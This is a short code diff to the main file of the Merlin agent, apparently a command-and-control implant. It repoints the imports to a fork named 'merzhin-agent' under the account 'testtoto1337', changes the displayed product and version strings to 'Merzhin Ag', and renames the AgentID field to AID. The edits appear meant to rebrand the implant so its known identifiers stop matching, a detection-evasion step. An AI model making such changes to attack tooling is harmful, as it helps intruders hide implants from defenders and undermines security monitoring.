@@ -32,9 +32,9 @@ import (
 	"github.com/google/shlex"
 
 	// Internal
-	"github.com/Ne0nd0g/merlin-agent/agent"
-	"github.com/Ne0nd0g/merlin-agent/clients/http"
-	"github.com/Ne0nd0g/merlin-agent/core"
+	"github.com/testtoto1337/merzhin-agent/agent"
+	"github.com/testtoto1337/merzhin-agent/clients/http"
+	"github.com/testtoto1337/merzhin-agent/core"
 )
 
 // GLOBAL VARIABLES
@@ -94,8 +94,8 @@ func main() {
 	flag.Parse()
 
 	if *version {
-		color.Blue(fmt.Sprintf("Merlin Agent Version: %s", core.Version))
-		color.Blue(fmt.Sprintf("Merlin Agent Build: %s", build))
+		color.Blue(fmt.Sprintf("Merzhin Ag Version: %s", core.Version))
+		color.Blue(fmt.Sprintf("Merzhin Ag Build: %s", build))
 		os.Exit(0)
 	}
 
@@ -120,7 +120,7 @@ func main() {
 	// Get the client
 	var errClient error
 	clientConfig := http.Config{
-		AgentID:     a.ID,
+		AID:     a.ID,
 		Protocol:    protocol,
 		Host:        host,
 		Headers:     headers,
@@ -151,7 +151,7 @@ func main() {
 
 // usage prints command line options
 func usage() {
-	fmt.Printf("Merlin Agent\r\n")
+	fmt.Printf("Merzhin Ag\r\n")
 	flag.PrintDefaults()
 	os.Exit(0)
 }
